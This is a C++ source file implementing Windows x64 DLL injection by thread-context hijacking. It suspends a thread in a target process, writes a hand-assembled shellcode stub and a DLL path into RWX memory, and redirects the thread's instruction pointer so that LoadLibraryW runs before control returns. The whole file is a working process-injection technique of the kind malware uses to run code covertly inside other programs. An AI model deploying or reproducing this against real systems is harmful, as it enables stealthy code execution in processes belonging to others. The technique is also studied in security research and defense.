#include "pch.h"
#include "Utils.h"
#include "ProcUtils.h"
#include "InjectionSetThreadContext.h"

// TODO: x86 version and LoadLibraryExW version (e.g. winword uses it)
BYTE codeToBeInjected[] = {
    // sub rsp, 28h
    0x48, 0x83, 0xec, 0x28,
    // mov [rsp + 18h], rax
    0x48, 0x89, 0x44, 0x24, 0x18,
    // mov [rsp + 10h], rcx
    0x48, 0x89, 0x4c, 0x24, 0x10,
    // mov rcx, 11111111111111111h; placeholder for DLL path
    0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
    // mov rax, 22222222222222222h; placeholder for “LoadLibraryW” address
    0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
    // call rax
    0xff, 0xd0,
    // mov rcx, [rsp + 10h]
    0x48, 0x8b, 0x4c, 0x24, 0x10,
    // mov rax, [rsp + 18h]
    0x48, 0x8b, 0x44, 0x24, 0x18,
    // add rsp, 28h
    0x48, 0x83, 0xc4, 0x28,
    // mov r11, 333333333333333333h; placeholder for the original RIP
    0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
    // jmp r11
    0x41, 0xff, 0xe3
};


bool InjectIntoThread(DWORD processId, DWORD remoteThreadId, const std::wstring& dllPath) {
    const DWORD DesiredAccess = PROCESS_ALL_ACCESS;
    wil::unique_handle remoteProcessHandle(OpenProcess(DesiredAccess, FALSE, processId));

    // THREAD_ALL_ACCESS is actually unnecessary
    const DWORD flags = THREAD_SET_CONTEXT | // For SetThreadContext
        THREAD_SUSPEND_RESUME | // For SuspendThread and ResumeThread
        THREAD_GET_CONTEXT;     // For GetThreadContext

    wil::unique_handle remoteThreadHandle(OpenThread(flags,
        FALSE,                  // Don't inherit handles
        remoteThreadId));        // TID of our target thread
    if (!remoteThreadHandle) {
        LogError(L"OpenThread", false);
        return false;
    }

    SYSTEM_INFO systemInformation;
    GetSystemInfo(&systemInformation);

    // Allocate systemInformation.dwPageSize bytes in the remote process
    LPBYTE buffer = static_cast<LPBYTE>(VirtualAllocEx(remoteProcessHandle.get(), NULL, systemInformation.dwPageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!buffer) {
        LogError(L"VirtualAllocEx", false);
        return false;
    }

    // Calculate how many bytes to write into the remote buffer
    size_t libraryPathSizeBytes = (dllPath.length() + 1) * sizeof(wchar_t);

    if (WriteProcessMemory(remoteProcessHandle.get(),
        buffer + systemInformation.dwPageSize / 2, dllPath.c_str(), libraryPathSizeBytes, NULL) == 0) {
        LogError(L"WriteProcessMemory", false);
        return false;
    }

    if (SuspendThread(remoteThreadHandle.get()) == (DWORD)(-1)) {
        LogError(L"SuspendThread", false);
        return false;
    }

    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_ALL;

    if (!GetThreadContext(remoteThreadHandle.get(), &context)) {
        LogError(L"GetThreadContext", false);
        return false;
    }

    // Get address of LoadLibraryW function
    FARPROC loadLibraryFunc = GetRemoteFunction(L"kernel32.dll", "LoadLibraryW");

    // v2 (doesn;t actually work): getting address of actual imported function
    //   (requires another shellcode if only LoadLibraryExW is imported)
    // TODO: fix this one
    //FARPROC loadLibraryFunc = NULL;
    //if (!GetRemoteFunctonInTargetProcessImportTable(processId, reinterpret_cast<PUINT_PTR>(&loadLibraryFunc),
    //        "Kernel32.dll", "LoadLibraryW")) {
    //    LogError(L"GetRemoteFunctonInTargetProcessImportTable", false);
    //    return false;
    //}

    // Set the DLL path
    PVOID* dllPathAddr = reinterpret_cast<PVOID*>(codeToBeInjected + 0x10);
    *dllPathAddr = static_cast<void*>(buffer + systemInformation.dwPageSize / 2);
    // Set LoadLibraryW address
    PVOID* loadLibraryAddr = reinterpret_cast<PVOID*>(codeToBeInjected + 0x1a);
    *loadLibraryAddr = static_cast<void*>(loadLibraryFunc);
    // Jump address (back to the original code)
    DWORD64* jumpAddr = reinterpret_cast<DWORD64*>(codeToBeInjected + 0x34);
    *jumpAddr = context.Rip;

    if (WriteProcessMemory(remoteProcessHandle.get(),
        buffer, static_cast<LPCVOID>(codeToBeInjected), sizeof(codeToBeInjected), NULL) == 0) {
        LogError(L"WriteProcessMemory", false);
        return false;
    }

    context.Rip = reinterpret_cast<DWORD64>(buffer);

    if (!SetThreadContext(remoteThreadHandle.get(), &context)) {
        LogError(L"SetThreadContext", false);
    }

    if (ResumeThread(remoteThreadHandle.get()) == (DWORD)(-1)) {
        LogError(L"ResumeThread", false);
    }

    // Don't need to execute VirtualFreeEx for buffer (?)

    return true;
}

bool InjectWithSetThreadContext(DWORD processId, const std::wstring& dllPath) {
    std::vector<DWORD> threadIds = GetProcessThreadIds(processId);
    if (threadIds.empty()) {
        return false;
    }

    DWORD remoteThreadId = threadIds[0]; // TODO: Select in a better way

    return InjectIntoThread(processId, remoteThreadId, dllPath);
}
